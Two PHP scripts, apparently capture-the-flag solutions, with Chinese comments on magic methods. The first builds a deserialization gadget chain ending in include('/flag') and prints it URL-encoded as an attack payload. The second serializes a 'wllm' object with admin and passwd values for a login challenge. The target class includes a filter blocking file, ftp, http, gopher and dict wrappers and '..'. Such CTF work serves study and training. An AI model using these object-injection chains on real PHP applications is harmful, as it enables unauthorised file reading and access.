```php
<?php
class Road_is_Long{
    public $page;
    public $string;
    #__construst():具有构造函数的类在创建新对象的时候
    public function __construct($file='index.php'){
        $this->page = $file;
    }
    #把类当成字符串的时候调用
    public function __toString(){
        return $this->string->page;
    }
    #反序列化的时候调用
    public function __wakeup(){
        if(preg_match("/file|ftp|http|https|gopher|dict|\.\./i", $this->page)) {
            echo "You can Not Enter 2022";
            $this->page = "index.php";
        }
    }
}

class Try_Work_Hard{
    protected  $var = "/flag";
    public function append($value){
        include($value);
    }
    #当尝试以调用函数的方式调用对象的时候，就会调用该方法
    public function __invoke(){
        $this->append($this->var);
    }
}

class Make_a_Change{
    public $effort;
    #具有构造函数的类在创建新对象的时候，回调此方法
    public function __construct(){
        $this->effort = array();
    }
    #读取不可访问或者不存在的属性的时候，进行赋值
    public function __get($key){
        $function = $this->effort;
        return $function();
    }
}

#Road_is_Long::__wakeup->Road_is_Long::__toString->Make_a_Change::__get->Try_Work_Hard::__invok->Try_Work_Hard::append
$a = new Road_is_Long();
$b = new Road_is_Long();
$c = new Make_a_Change();
$d = new Try_Work_Hard();
$a -> page = $b;
$b -> string = $c;
$c -> effort = $d;
echo urlencode(serialize($a));
```

```php
<?php


class wllm{

    public $admin;
    public $passwd;

    
    }


$p = new wllm();
$p -> admin = 'admin';
$p -> passwd = 'ctf';
echo serialize($p);
echo "\n";
echo urlencode(serialize($p));
?>
```